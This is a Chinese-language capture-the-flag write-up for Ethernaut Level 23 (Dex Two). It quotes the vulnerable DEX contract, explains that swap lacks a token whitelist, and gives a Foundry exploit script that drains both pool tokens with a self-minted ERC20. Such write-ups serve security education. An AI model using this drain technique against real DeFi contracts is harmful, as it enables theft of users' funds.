# Level 23 - Dex Two
## 題目
[Dex Two](https://ethernaut.openzeppelin.com/level/0xf59112032D54862E199626F55cFad4F8a3b0Fce9)

### 通關條件
This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

### 提示
How has the swap method been modified?

### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
## 解題
提示說看 `swap(address from, address to, uint256 amount)` 跟上一關的有什麼不一樣：

Dex2：
```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}

function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```
[Level 22 - Dex](https://hackmd.io/@D13/ethernaut22)：
```solidity
function swap(address from, address to, uint256 amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}

function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

兩關的合約在計算價格的方式是一樣的，不一樣的只有這關少一個「條件判斷」；代表可以將不屬於這題的代幣用來交易。這樣就很簡單了，我們只要用別的代幣把 token1 跟 token2 都換出來就好了。
 $$  Amount(token2) = \frac{Amount(token1) * Balance(token2)}{Balance(token1)} $$
 
按照價格公式來看的話，我們只要先給關卡 1 枚我們自建的代幣，再用 1 枚就可以換出 token2 的 100 枚，因為 可以換出的 token2 數量 = 轉進去的 token1 數量 * 關卡中 token2 的數量 / 關卡中 token1 的數量，也就是：`換出 100 枚 = 1 * 100 / 1`。
換完後關卡中有 2 枚，套用上面的思路，只要再給 2 枚就可以將 token1 的 100 枚也換出來，整理攻擊流程：
1. 建立自己的代幣
2. 給關卡 1 枚自己的代幣
3. 用 1 枚自己的代幣，將 token2 全數換出
4. 用 1 枚自己的代幣，將 token1 全數換出
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/23_Dex2.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract ExploitScript is Script {
    DexTwo level23 = DexTwo(payable(your_challenge_address));
    TokenToken tokentoken;

    function run() external {
        vm.startBroadcast();
        
        tokentoken = new TokenToken();
        tokentoken.transfer(address(level23),1);
        tokentoken.approve(address(level23),4);
        address token1 = level23.token1();
        address token2 = level23.token2();
        level23.swap(address(tokentoken), token2, 1);
        level23.swap(address(tokentoken), token1, 2);

        vm.stopBroadcast();
    }
}

contract TokenToken is ERC20 {
    
    constructor() ERC20("TokenToken", "TkTk") public {
        _mint(msg.sender, 4);
    }
}
```